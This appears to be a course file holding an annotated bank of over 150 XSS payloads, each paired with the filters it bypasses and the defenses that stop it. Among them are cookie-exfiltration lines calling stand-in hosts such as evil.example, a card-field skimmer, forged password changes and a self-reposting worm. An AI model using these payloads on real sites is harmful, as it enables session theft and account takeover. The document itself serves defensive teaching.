/* payloads.js — the annotated XSS payload bank (150+ entries).
   Shared by payload_bank.html (all) and payloads/NN_*.html (per category).

   Each entry is a hypothesis about a broken assumption. Fields:
     cat      : category id (1..10)
     p        : the raw payload string
     ctx      : where it lands (injection context)
     mech     : execution mechanism(s) 1..5 (the course taxonomy)
     bypass   : what filter/defense it defeats
     stop     : what WOULD stop it
     origin   : real-world origin / lineage

   The renderer ESCAPES every payload before display, so this reference page
   never executes anything. Copy a payload and test it in the lab endpoints.
*/
(function () {
  "use strict";

  const CATS = {
    1: "Script tags",
    2: "Event handlers",
    3: "URI schemes",
    4: "SVG / MathML",
    5: "DOM sinks",
    6: "Filter evasion",
    7: "Mutation XSS (mXSS)",
    8: "Chaining payloads",
    9: "Exotic / modern",
    10: "Real-world derived",
  };

  const MECH = {
    1: "Tag parsing", 2: "Event attr", 3: "URI scheme",
    4: "DOM sink", 5: "Escape/reparse",
  };

  const P = [
    // ===== 1. SCRIPT TAGS ===================================================
    {cat:1, p:`<script>alert(document.domain)</script>`, ctx:"HTML text", mech:[1],
     bypass:"none (baseline)", stop:"HTML-text encoding; CSP script-src", origin:"the canonical XSS"},
    {cat:1, p:`<script src="//evil.example/x.js"></script>`, ctx:"HTML text", mech:[1],
     bypass:"inline-script CSP that still allows external hosts", stop:"CSP host allowlist / nonce", origin:"external loader"},
    {cat:1, p:`<script>eval(atob('YWxlcnQoMSk='))</script>`, ctx:"HTML text", mech:[1,4],
     bypass:"keyword filters (no 'alert' literal)", stop:"CSP (no 'unsafe-eval'); nonce", origin:"base64 staging"},
    {cat:1, p:`<ScRiPt>alert(1)</ScRiPt>`, ctx:"HTML text", mech:[1],
     bypass:"case-sensitive string filters", stop:"case-insensitive parse / encoding", origin:"case trick"},
    {cat:1, p:`<script\n>alert(1)</script\n>`, ctx:"HTML text", mech:[1],
     bypass:"regex expecting <script>", stop:"encoding; the parser tolerates whitespace", origin:"whitespace in tag"},
    {cat:1, p:`<script/src=data:,alert(1)>`, ctx:"HTML text", mech:[1,3],
     bypass:"filters keying on 'src=\"'; slash as separator", stop:"CSP; encoding", origin:"slash separator + data URL"},
    {cat:1, p:`<scr<script>ipt>alert(1)</scr</script>ipt>`, ctx:"HTML text", mech:[1,5],
     bypass:"non-recursive tag stripping (removing inner <script> reveals outer)", stop:"recursive/parse-based sanitize", origin:"overlapping-tag filter bypass"},
    {cat:1, p:`<script>window['al'+'ert'](1)</script>`, ctx:"HTML text", mech:[1],
     bypass:"substring match on 'alert'", stop:"CSP; nonce", origin:"string reconstruction"},
    {cat:1, p:`<script>setTimeout('alert(1)')</script>`, ctx:"HTML text", mech:[1,4],
     bypass:"filters that only block direct eval", stop:"CSP; avoid string timers", origin:"string setTimeout"},
    {cat:1, p:`<template><script>alert(1)</script></template>`, ctx:"HTML text", mech:[1,5],
     bypass:"sanitizers that ignore <template> content", stop:"parse-aware sanitize; CSP", origin:"template inert-until-adopted"},
    {cat:1, p:`<svg><script>alert(1)</script></svg>`, ctx:"HTML text", mech:[1],
     bypass:"HTML-only denylists (SVG has its own <script>)", stop:"namespace-aware sanitize; CSP", origin:"SVG script"},
    {cat:1, p:`<script>fetch('/collect?d='+document.cookie)</script>`, ctx:"HTML text", mech:[1,4],
     bypass:"execution-only view of impact", stop:"HttpOnly; CSP connect-src", origin:"exfil script"},
    {cat:1, p:`<script type="module">import('data:text/javascript,alert(1)')</script>`, ctx:"HTML text", mech:[1,3],
     bypass:"classic-script-focused filters", stop:"CSP script-src; Trusted Types (script URL)", origin:"module import()"},

    // ===== 2. EVENT HANDLERS ================================================
    {cat:2, p:`<img src=x onerror=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"<script> blocking", stop:"attribute encoding; CSP (no unsafe-inline)", origin:"the universal fallback"},
    {cat:2, p:`<svg onload=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"<script> blocking; auto-fires", stop:"CSP; encoding", origin:"zero-interaction classic"},
    {cat:2, p:`<body onload=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"tag allowlists missing on*", stop:"CSP; encoding", origin:"document-level handler"},
    {cat:2, p:`<input autofocus onfocus=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"'needs interaction' assumptions", stop:"CSP; encoding", origin:"autofocus zero-click"},
    {cat:2, p:`<select autofocus onfocus=alert(1)><option>`, ctx:"HTML text", mech:[2],
     bypass:"filters allowing form controls", stop:"CSP; encoding", origin:"autofocus variant"},
    {cat:2, p:`<body onpageshow=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"onload-only denylists; fires from bfcache", stop:"CSP; encoding", origin:"bfcache handler"},
    {cat:2, p:`<video><source onerror=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"img-focused filters", stop:"CSP; encoding", origin:"media error handler"},
    {cat:2, p:`<details open ontoggle=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"long-tail handler unknown to denylist", stop:"CSP; encoding", origin:"ontoggle auto"},
    {cat:2, p:`<marquee onstart=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"legacy-tag blind spots", stop:"CSP; encoding", origin:"legacy auto-firer"},
    {cat:2, p:`<x contenteditable onbeforeinput=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"handlers on arbitrary elements", stop:"CSP; encoding", origin:"editing event"},
    {cat:2, p:`" onmouseover="alert(1)`, ctx:'inside value="…"', mech:[5,2],
     bypass:"angle-bracket filters (uses none)", stop:"attribute-quote encoding", origin:"attribute break-out"},
    {cat:2, p:`" autofocus onfocus="alert(1)`, ctx:'inside value="…"', mech:[5,2],
     bypass:"angle-bracket filters; zero-click", stop:"attribute-quote encoding", origin:"break-out + autofocus"},
    {cat:2, p:`onmouseover=alert(1)//`, ctx:"unquoted attribute", mech:[5,2],
     bypass:"no quote needed; whitespace ends value", stop:"quote attributes + encode", origin:"unquoted-attr inject"},
    {cat:2, p:`<img src=x onerror=alert\`1\`>`, ctx:"HTML text", mech:[2],
     bypass:"filters requiring () after handler", stop:"CSP; encoding", origin:"tagged-template call"},

    // ===== 3. URI SCHEMES ===================================================
    {cat:3, p:`<a href="javascript:alert(1)">x</a>`, ctx:"href value", mech:[3],
     bypass:"tag/handler filters", stop:"scheme allowlist (after decode); CSP", origin:"javascript: URL"},
    {cat:3, p:`<iframe src="javascript:alert(1)">`, ctx:"src value", mech:[3],
     bypass:"href-only checks", stop:"scheme allowlist; CSP frame-src", origin:"iframe scheme"},
    {cat:3, p:`<form><button formaction="javascript:alert(1)">go`, ctx:"formaction value", mech:[3],
     bypass:"checks on <form action> only", stop:"scheme allowlist; CSP", origin:"formaction sink"},
    {cat:3, p:`<a href="jav&#x09;ascript:alert(1)">x</a>`, ctx:"href value", mech:[3,5],
     bypass:"literal 'javascript:' match (tab breaks it)", stop:"decode-then-allowlist", origin:"embedded control char"},
    {cat:3, p:`<a href="java&#115;cript:alert(1)">x</a>`, ctx:"href value", mech:[3,5],
     bypass:"literal match (entity decodes to 's')", stop:"decode-then-allowlist", origin:"entity-encoded scheme"},
    {cat:3, p:`<a href="javascript&colon;alert(1)">x</a>`, ctx:"href value", mech:[3,5],
     bypass:"looking for 'javascript:' (colon is entity)", stop:"decode-then-allowlist", origin:"&colon; trick"},
    {cat:3, p:`<a href="  javascript:alert(1)">x</a>`, ctx:"href value", mech:[3,5],
     bypass:"prefix checks (leading spaces)", stop:"trim + decode + allowlist", origin:"leading-whitespace"},
    {cat:3, p:`<iframe src="data:text/html,<script>alert(1)</script>">`, ctx:"src value", mech:[3,1],
     bypass:"javascript:-only blocks", stop:"block data: in framing; CSP", origin:"data: document"},
    {cat:3, p:`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`, ctx:"src value", mech:[3,1],
     bypass:"substring scanning (payload is base64)", stop:"block data: framing; CSP", origin:"base64 data URL"},
    {cat:3, p:`<object data="javascript:alert(1)">`, ctx:"data value", mech:[3],
     bypass:"iframe/href-focused filters", stop:"object-src 'none'; scheme allowlist", origin:"object data scheme"},
    {cat:3, p:`<svg><a xlink:href="javascript:alert(1)"><text x=10 y=20>x</text></a></svg>`, ctx:"SVG xlink:href", mech:[3,4],
     bypass:"HTML-href-only checks", stop:"namespace-aware allowlist; CSP", origin:"SVG xlink scheme"},
    {cat:3, p:`<a href="VBScript:msgbox(1)">x</a>`, ctx:"href value", mech:[3],
     bypass:"javascript:-only denylist (legacy IE)", stop:"scheme allowlist", origin:"legacy vbscript:"},

    // ===== 4. SVG / MATHML ==================================================
    {cat:4, p:`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`, ctx:"inline SVG", mech:[2],
     bypass:"HTML handler denylists (SMIL onbegin)", stop:"namespace-aware sanitize; CSP", origin:"SMIL animation event"},
    {cat:4, p:`<svg><set attributeName=x onbegin=alert(1)>`, ctx:"inline SVG", mech:[2],
     bypass:"unknown SVG handler", stop:"namespace-aware sanitize; CSP", origin:"SVG <set>"},
    {cat:4, p:`<svg><foreignObject><iframe onload=alert(1)></foreignObject></svg>`, ctx:"inline SVG", mech:[1,2,5],
     bypass:"sanitizer treats subtree as SVG-only", stop:"handle integration points; CSP", origin:"foreignObject re-enters HTML"},
    {cat:4, p:`<math><maction actiontype=statusline xlink:href="javascript:alert(1)">x</maction></math>`, ctx:"inline MathML", mech:[3],
     bypass:"HTML-only URL checks", stop:"namespace-aware allowlist", origin:"MathML maction"},
    {cat:4, p:`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, ctx:"inline MathML", mech:[5,2],
     bypass:"string sanitizers (integration-point mutation)", stop:"mutation-aware DOM sanitize; TT", origin:"mglyph mXSS gadget"},
    {cat:4, p:`<svg><style>{}*{-o-link:'javascript:alert(1)'}</style>`, ctx:"SVG style", mech:[3],
     bypass:"CSS-blind HTML filters (legacy)", stop:"strip style; CSP", origin:"CSS url scheme (legacy)"},
    {cat:4, p:`<svg><use href="data:image/svg+xml,<svg id=x xmlns=...><script>alert(1)</script></svg>#x"/>`, ctx:"SVG use", mech:[1,3],
     bypass:"filters ignoring <use> external refs", stop:"block external use; CSP", origin:"SVG <use> external"},
    {cat:4, p:`<svg xmlns="http://www.w3.org/2000/svg" onload=alert(1)>`, ctx:"uploaded/standalone SVG", mech:[2],
     bypass:"'it's just an image'", stop:"serve as attachment+nosniff; separate origin", origin:"SVG-as-document upload"},
    {cat:4, p:`<SVG><CIRCLE onload=alert(1)>`, ctx:"inline SVG", mech:[2,5],
     bypass:"lowercasing sanitizers (foreign content case rules)", stop:"namespace-correct casing", origin:"case-sensitivity break"},
    {cat:4, p:`<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></svg>`, ctx:"inline SVG", mech:[5,2],
     bypass:"CDATA handling differences", stop:"parse-aware sanitize", origin:"CDATA confusion"},
    {cat:4, p:`<svg><image href="x" onerror=alert(1)>`, ctx:"inline SVG", mech:[2],
     bypass:"<img>-focused filters (SVG <image>)", stop:"namespace-aware sanitize", origin:"SVG <image> onerror"},
    {cat:4, p:`<math href="javascript:alert(1)">CLICK</math>`, ctx:"inline MathML", mech:[3],
     bypass:"HTML-only href checks", stop:"namespace-aware allowlist", origin:"MathML href (legacy)"},

    // ===== 5. DOM SINKS =====================================================
    {cat:5, p:`#<img src=x onerror=alert(1)>`, ctx:"location.hash → innerHTML", mech:[4,2],
     bypass:"server-side WAF (fragment not sent)", stop:"textContent; Trusted Types", origin:"hash → innerHTML DOM XSS"},
    {cat:5, p:`?q=<img src=x onerror=alert(1)>`, ctx:"location.search → innerHTML", mech:[4,2],
     bypass:"server WAF if read client-side", stop:"safe sink; Trusted Types", origin:"search → innerHTML"},
    {cat:5, p:`javascript:alert(1)`, ctx:"value → location.href =", mech:[4,3],
     bypass:"markup filters (no tags)", stop:"scheme allowlist before assign", origin:"location sink"},
    {cat:5, p:`\\";alert(1);//`, ctx:"inside a JS string via template", mech:[4,5],
     bypass:"HTML encoding (wrong context)", stop:"JS-string encoding; avoid inline data", origin:"JS-context break-out"},
    {cat:5, p:`');alert(1);//`, ctx:"eval('...'+input+'...')", mech:[4],
     bypass:"any HTML defense (it's JS)", stop:"never eval input; JSON.parse", origin:"eval sink"},
    {cat:5, p:`constructor.constructor('alert(1)')()`, ctx:"template-expression sink (some libs)", mech:[4],
     bypass:"sandboxed expression evaluators", stop:"real sandbox; avoid dynamic eval", origin:"function constructor gadget"},
    {cat:5, p:`<img src=x onerror=alert(1)>`, ctx:"$(userInput) jQuery", mech:[4,2],
     bypass:"assuming $() is safe", stop:"$(document.createTextNode(x)); TT", origin:"jQuery html-parse source"},
    {cat:5, p:`<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">`, ctx:"el.srcdoc = input", mech:[4,1,5],
     bypass:"forgetting srcdoc is a code sink; double decode", stop:"Trusted Types; sanitize", origin:"srcdoc sink"},
    {cat:5, p:`{{constructor.constructor('alert(1)')()}}`, ctx:"Angular/template expression", mech:[4],
     bypass:"template sandbox (historic AngularJS)", stop:"CSP; upgraded framework", origin:"AngularJS sandbox escape"},
    {cat:5, p:`data:text/html,<script>alert(1)</script>`, ctx:"window.open(input)", mech:[4,3,1],
     bypass:"filters not treating open() as nav sink", stop:"scheme allowlist", origin:"window.open sink"},
    {cat:5, p:`<a href=x>`, ctx:"document.write(input)", mech:[4,1],
     bypass:"async filters (write injects into parse stream)", stop:"avoid document.write; TT", origin:"document.write sink"},
    {cat:5, p:`__proto__[widgetHtml]=<img src=x onerror=alert(1)>`, ctx:"query → unsafe merge → innerHTML default", mech:[4],
     bypass:"no direct injection point", stop:"block __proto__ keys; TT; Object.create(null)", origin:"prototype-pollution gadget"},

    // ===== 6. FILTER EVASION ================================================
    {cat:6, p:`<svg onload=confirm(document.domain)>`, ctx:"HTML text", mech:[2],
     bypass:"denylist of alert/onerror/script", stop:"CSP; allowlist; encoding", origin:"handler+function swap"},
    {cat:6, p:`<svg/onload=confirm(1)>`, ctx:"HTML text", mech:[2],
     bypass:"regex expecting space before on*", stop:"encoding; CSP", origin:"slash separator"},
    {cat:6, p:`<img src=x onerror=window['al'+'ert'](1)>`, ctx:"HTML text", mech:[2],
     bypass:"substring 'alert'", stop:"CSP; encoding", origin:"string reconstruction"},
    {cat:6, p:`%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`, ctx:"URL param (single-decoded)", mech:[2],
     bypass:"filter scanning after its own decode", stop:"decode fully before filtering; encode output", origin:"URL-encoding"},
    {cat:6, p:`%253Cscript%253Ealert(1)%253C/script%253E`, ctx:"double URL-encoded param", mech:[1],
     bypass:"single-decode filter", stop:"canonicalize before checks", origin:"double-encoding"},
    {cat:6, p:`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, ctx:"HTML text", mech:[2,4],
     bypass:"any keyword denylist", stop:"CSP (no unsafe-eval)", origin:"base64+atob"},
    {cat:6, p:`<img src=x oNeRrOr=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"case-sensitive handler match", stop:"encoding; CSP", origin:"case variation"},
    {cat:6, p:`<img/**/src=x/**/onerror=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"filters not expecting comment-like separators", stop:"encoding; CSP", origin:"comment separators"},
    {cat:6, p:`<img src=x onerror=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"HTML-source keyword scan (JS decodes escape)", stop:"CSP", origin:"JS unicode escape"},
    {cat:6, p:`<a href="javas&#99;ript:alert(1)">x</a>`, ctx:"href value", mech:[3,5],
     bypass:"literal scheme match", stop:"decode-then-allowlist", origin:"decimal entity"},
    {cat:6, p:`<img src=x onerror=alert(1)//comment>`, ctx:"HTML text", mech:[2],
     bypass:"filters matching to end of attribute", stop:"encoding; CSP", origin:"JS comment tail"},
    {cat:6, p:`<img src=x onerror=top[8680439..toString(30)](1)>`, ctx:"HTML text", mech:[2],
     bypass:"no literal 'alert' anywhere", stop:"CSP", origin:"radix-encoded 'alert'"},
    {cat:6, p:`<img src=x onerror=alert(1) `, ctx:"HTML text (unclosed)", mech:[2],
     bypass:"filters requiring a closing >", stop:"encoding; parser finalizes anyway", origin:"missing close bracket"},

    // ===== 7. MUTATION XSS ==================================================
    {cat:7, p:`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`, ctx:"sanitize → innerHTML", mech:[5,2],
     bypass:"sanitizer (noscript raw-text with scripting on)", stop:"fixed-point sanitize; TT", origin:"noscript mXSS (Heiderich)"},
    {cat:7, p:`<template><script>alert(1)</script></template>`, ctx:"sanitize → innerHTML", mech:[5,1],
     bypass:"sanitizers ignoring template.content", stop:"parse template content; TT", origin:"template mutation"},
    {cat:7, p:`<table><td><style></style><img src=x onerror=alert(1)></table>`, ctx:"sanitize → innerHTML", mech:[5,2],
     bypass:"foster-parenting relocates nodes on reparse", stop:"fixed-point DOM sanitize", origin:"table foster-parent mXSS"},
    {cat:7, p:`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`, ctx:"sanitize → innerHTML", mech:[5,2],
     bypass:"namespace integration-point mutation", stop:"namespace-aware fixed-point sanitize", origin:"mglyph/mtext mXSS"},
    {cat:7, p:`<xmp><img src=x onerror=alert(1)></xmp>`, ctx:"sanitize → innerHTML", mech:[5,2],
     bypass:"RAWTEXT boundary shift on reparse", stop:"parse-aware sanitize", origin:"xmp raw-text mutation"},
    {cat:7, p:`<style><img src=x onerror=alert(1)></style>`, ctx:"context change from RAWTEXT", mech:[5,2],
     bypass:"style content treated as text until </style>", stop:"strip style; parse-aware sanitize", origin:"style RAWTEXT unmask"},
    {cat:7, p:`<listing>&lt;img src=x onerror=alert(1)&gt;</listing>`, ctx:"reparse entity decode", mech:[5,2],
     bypass:"entity decoding across a round-trip", stop:"fixed-point sanitize", origin:"listing/entity mXSS"},
    {cat:7, p:`<select><style></select><img src=x onerror=alert(1)>`, ctx:"sanitize → innerHTML", mech:[5,2],
     bypass:"in-select insertion-mode quirks", stop:"fixed-point sanitize", origin:"select-mode mutation"},
    {cat:7, p:`<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`, ctx:"sanitize → innerHTML", mech:[5,2],
     bypass:"implicit </p>, style boundary + attr quote", stop:"fixed-point DOM sanitize", origin:"composed mutation chain"},
    {cat:7, p:`<a><math><mtext></a><mglyph><svg><mtext><style><img src onerror=alert(1)>`, ctx:"sanitize → innerHTML", mech:[5,2],
     bypass:"nested namespace flips", stop:"namespace-aware fixed-point sanitize", origin:"backtick/namespace mXSS lineage"},
    {cat:7, p:`<textarea><img src=x onerror=alert(1)></textarea>`, ctx:"RCDATA context change", mech:[5,2],
     bypass:"content is RCDATA until </textarea>", stop:"parse-aware sanitize", origin:"textarea RCDATA unmask"},

    // ===== 8. CHAINING PAYLOADS =============================================
    {cat:8, p:`<img src=x onerror="new Image().src='/collect?d='+encodeURIComponent(document.cookie)">`, ctx:"HTML text", mech:[2,4],
     bypass:"execution-only mitigations", stop:"HttpOnly; CSP connect/img-src", origin:"cookie exfil beacon"},
    {cat:8, p:`<svg onload="fetch('/auth/account').then(r=>r.text()).then(t=>/*scrape CSRF, forge POST*/0)">`, ctx:"HTML text", mech:[2,4],
     bypass:"CSRF tokens (same-origin read)", stop:"prevent XSS; re-auth on sensitive actions", origin:"CSRF-token theft → forgery"},
    {cat:8, p:`<script>navigator.serviceWorker.register('/sw-evil.js')</script>`, ctx:"HTML text", mech:[1,4],
     bypass:"one-shot injection assumptions (persists)", stop:"CSP; SW scope control", origin:"persistent SW foothold"},
    {cat:8, p:`<form action="/auth/change-password" method=post id=f><input name=csrf value=TOKEN><input name=newpw value=pwned></form><script>f.submit()</script>`, ctx:"HTML text", mech:[1,4],
     bypass:"SameSite (same-site request); CSRF token (read on page)", stop:"re-auth; prevent XSS", origin:"forged state-change"},
    {cat:8, p:`<div style="position:fixed;inset:0;background:#fff">FAKE LOGIN…</div>`, ctx:"HTML text", mech:[1],
     bypass:"user trust in the real origin/URL bar", stop:"prevent XSS; framebusting won't help", origin:"credential-overlay phishing"},
    {cat:8, p:`<script>fetch('/api/keys').then(r=>r.text()).then(k=>new Image().src='/collect?d='+k)</script>`, ctx:"HTML text", mech:[1,4],
     bypass:"HttpOnly (reads API, not cookie)", stop:"CSP connect-src; scope secrets", origin:"API/token theft"},
    {cat:8, p:`<img src=x onerror="document.querySelectorAll('input[name*=card]').forEach(e=>e.addEventListener('change',ev=>navigator.sendBeacon('/collect',ev.target.value)))">`, ctx:"checkout HTML", mech:[2,4],
     bypass:"execution-only view", stop:"payment iframe isolation; CSP connect-src; SRI", origin:"Magecart-style skimmer"},
    {cat:8, p:`<script>location='//evil.example/?c='+document.cookie</script>`, ctx:"HTML text", mech:[1,4],
     bypass:"no HttpOnly", stop:"HttpOnly; CSP", origin:"redirect exfil"},
    {cat:8, p:`<script>document.title=document.cookie</script>`, ctx:"HTML text (blind)", mech:[1,4],
     bypass:"no outbound network (DOM-stash channel)", stop:"HttpOnly; egress control", origin:"DOM-stash side channel"},
    {cat:8, p:`<script>fetch('/comments',{method:'POST',body:'body='+encodeURIComponent(document.currentScript.outerHTML)})</script>`, ctx:"stored HTML", mech:[1,4],
     bypass:"single-victim assumptions (self-propagates)", stop:"prevent stored XSS; rate-limit; CSP", origin:"worm self-repost (Samy lineage)"},

    // ===== 9. EXOTIC / MODERN ===============================================
    {cat:9, p:`<a href="javascript:alert(1)" target=_blank rel=opener>x</a>`, ctx:"href value", mech:[3],
     bypass:"rel=noopener assumptions", stop:"scheme allowlist; noopener", origin:"opener + scheme"},
    {cat:9, p:`<iframe csp="script-src 'unsafe-inline'" srcdoc="<img src=x onerror=alert(1)>">`, ctx:"framed HTML", mech:[2,4],
     bypass:"parent CSP if child sets weaker", stop:"frame-src; sanitize srcdoc", origin:"iframe csp attribute"},
    {cat:9, p:`<button popovertarget=p><div id=p popover onbeforetoggle=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"denylists predating popover API", stop:"CSP; encoding", origin:"popover onbeforetoggle"},
    {cat:9, p:`<link rel=stylesheet href="data:,*{}">` , ctx:"HTML text", mech:[1],
     bypass:"style-injection precursor (CSS exfil)", stop:"CSP style-src; encoding", origin:"CSS injection vector"},
    {cat:9, p:`<meta http-equiv=refresh content="0;url=javascript:alert(1)">`, ctx:"HTML head/text", mech:[3],
     bypass:"filters ignoring <meta>", stop:"strip meta-refresh; CSP", origin:"meta refresh scheme"},
    {cat:9, p:`<base href="javascript:/*"><a href=//x>y</a>`, ctx:"HTML head/text", mech:[3,5],
     bypass:"relative-URL trust; dangling markup", stop:"base-uri 'none'", origin:"base tag hijack"},
    {cat:9, p:`<img src=1 loading=lazy onerror=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"scanners assuming eager load timing", stop:"CSP; encoding", origin:"lazy-loading timing"},
    {cat:9, p:`<script>import('data:text/javascript,alert(1)')</script>`, ctx:"HTML text", mech:[1,3],
     bypass:"classic-script CSP focus", stop:"script-src for module URLs; TT", origin:"dynamic import data URL"},
    {cat:9, p:`<portal src="data:text/html,<script>alert(1)</script>"></portal>`, ctx:"HTML text", mech:[3,1],
     bypass:"iframe-only framing filters (experimental portal)", stop:"CSP; disallow portal", origin:"portal element (experimental)"},
    {cat:9, p:`<input type=image src=x onerror=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"<img>-specific filters", stop:"CSP; encoding", origin:"input[type=image] onerror"},
    {cat:9, p:`<isindex type=image src=1 onerror=alert(1)>`, ctx:"HTML text", mech:[2],
     bypass:"denylists missing obsolete elements", stop:"CSP; encoding", origin:"obsolete <isindex>"},
    {cat:9, p:`<x onclick=alert(1) style="display:block;height:100vh">`, ctx:"HTML text", mech:[2],
     bypass:"needs-a-known-tag assumptions (custom element)", stop:"CSP; encoding", origin:"unknown-element handler"},

    // ===== 10. REAL-WORLD DERIVED ===========================================
    {cat:10, p:`java\nscript:alert(1)`, ctx:"profile URL field → href", mech:[3,5],
     bypass:"'javascript' keyword split by newline", stop:"decode/normalize + allowlist", origin:"Samy worm (MySpace 2005)"},
    {cat:10, p:`"onmouseover="$.getScript('//evil/x.js')`, ctx:"linkified tweet href break-out", mech:[5,2],
     bypass:"attribute-context break-out in auto-linkify", stop:"attribute encoding; CSP", origin:"Twitter onMouseOver worm (2010)"},
    {cat:10, p:`$('input[name]').each(function(){b(this.value)})`, ctx:"compromised checkout script", mech:[4],
     bypass:"missing SRI; trusted third-party script", stop:"SRI; CSP connect-src; payment iframe", origin:"British Airways Magecart (2018)"},
    {cat:10, p:`<img src=x onerror=this.src='//evil/c?'+document.cookie>`, ctx:"stored comment", mech:[2,4],
     bypass:"no HttpOnly; stored delivery", stop:"HttpOnly; output encoding; CSP", origin:"generic stored-XSS session theft"},
    {cat:10, p:`{{constructor.constructor('alert(1)')()}}`, ctx:"AngularJS {{ }} interpolation", mech:[4],
     bypass:"AngularJS expression sandbox (pre-1.6)", stop:"upgrade; CSP; avoid ng in user data", origin:"AngularJS sandbox-escape CVEs"},
    {cat:10, p:`<div data-bind="html: userField"></div>`, ctx:"Knockout html binding", mech:[4,1],
     bypass:"framework html-binding = innerHTML", stop:"text binding; sanitize; TT", origin:"MVVM html-binding XSS"},
    {cat:10, p:`<img src=x onerror=alert(1)>`, ctx:"markdown image title rendered raw", mech:[2],
     bypass:"markdown renderers emitting raw HTML", stop:"sanitize rendered HTML; disable raw HTML", origin:"markdown-renderer XSS (many CVEs)"},
    {cat:10, p:`</script><script>alert(1)</script>`, ctx:"JSON state in <script> (SSR)", mech:[5,1],
     bypass:"embedding unescaped data in inline <script>", stop:"escape </ and <! in JSON; nonce CSP", origin:"SSR __INITIAL_STATE__ breakout"},
    {cat:10, p:` alert(1)`, ctx:"JS string (line separator)", mech:[4,5],
     bypass:"JSON in <script> (U+2028 breaks JS string)", stop:"escape U+2028/2029 in embedded JSON", origin:"JSON-in-script line-sep bug"},
    {cat:10, p:`<a href="//attacker.example">continue</a>`, ctx:"open redirect return-url", mech:[3],
     bypass:"host not allowlisted", stop:"redirect host allowlist", origin:"open-redirect delivery amplifier"},
    {cat:10, p:`<svg onload=alert(document.domain)>`, ctx:"uploaded SVG avatar served same-origin", mech:[2],
     bypass:"'images are safe' + same-origin serving", stop:"attachment+nosniff; separate origin; rasterize", origin:"SVG-avatar XSS (common bug bounty)"},
  ];

  function esc(s) {
    return s.replace(/[&<>"']/g, (c) =>
      ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;" }[c]));
  }

  function mechBadges(mech) {
    return mech.map((m) =>
      `<span class="mechtag m${m}" title="${MECH[m]}">${m} ${MECH[m]}</span>`
    ).join(" ");
  }

  // Render into #bank. If window.BANK_CATEGORY is set (1..10), filter to it.
  function render() {
    const host = document.getElementById("bank");
    if (!host) return;
    const only = window.BANK_CATEGORY || null;
    const filterBox = document.getElementById("bankFilter");
    const term = (filterBox && filterBox.value || "").toLowerCase();

    let items = P.filter((e) => (!only || e.cat === only));
    if (term) {
      items = items.filter((e) =>
        (e.p + e.ctx + e.bypass + e.stop + e.origin +
         e.mech.map((m) => MECH[m]).join(" ")).toLowerCase().includes(term));
    }

    const count = document.getElementById("bankCount");
    if (count) count.textContent =
      `${items.length} payload${items.length === 1 ? "" : "s"} shown` +
      (only ? ` · category: ${CATS[only]}` : ` · all ${P.length} in bank`);

    host.innerHTML = items.map((e, i) => `
      <div class="card">
        <div style="display:flex;justify-content:space-between;gap:8px;align-items:center">
          <div>${mechBadges(e.mech)}</div>
          <div style="font-size:.72rem;color:#888">${esc(CATS[e.cat])} · #${i + 1}</div>
        </div>
        <div class="payload" style="margin-top:8px">
          <input readonly value="${esc(e.p)}" id="bp${only||'a'}${i}">
          <button class="copy" data-copy="#bp${only||'a'}${i}">copy</button>
        </div>
        <table style="margin:6px 0 0">
          <tr><th style="width:130px">Context</th><td>${esc(e.ctx)}</td></tr>
          <tr><th>Why it runs</th><td>${e.mech.map((m)=>MECH[m]).join(" + ")} (mechanism ${e.mech.join("+")})</td></tr>
          <tr><th>Bypasses</th><td>${esc(e.bypass)}</td></tr>
          <tr><th>Stopped by</th><td style="color:#0b6e4f">${esc(e.stop)}</td></tr>
          <tr><th>Origin</th><td>${esc(e.origin)}</td></tr>
        </table>
      </div>`).join("");
  }

  window.PayloadBank = { data: P, cats: CATS, mech: MECH, render };
  window.addEventListener("DOMContentLoaded", function () {
    render();
    const f = document.getElementById("bankFilter");
    if (f) f.addEventListener("input", render);
  });
})();
